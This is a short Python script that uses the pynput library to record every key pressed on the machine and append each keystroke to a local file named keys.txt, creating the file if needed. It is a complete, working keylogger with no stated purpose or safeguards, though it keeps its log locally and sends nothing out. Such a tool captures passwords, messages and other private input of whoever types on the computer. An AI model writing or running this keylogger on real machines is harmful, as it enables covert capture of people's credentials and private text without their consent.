#https://pynput.readthedocs.io/en/stable/index.html
from pynput import keyboard
import os


if os.path.isfile("keys.txt"):
    print("All G")
else:
    with open("keys.txt", "w") as make:
        print("Made A File")


def on_press(key):
    try:
        with open("keys.txt", "a") as log:
            log.write(str(key.char) + "\n")

    except AttributeError:
        with open("keys.txt", "a") as log:
            log.write(str(key) + "\n")


# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
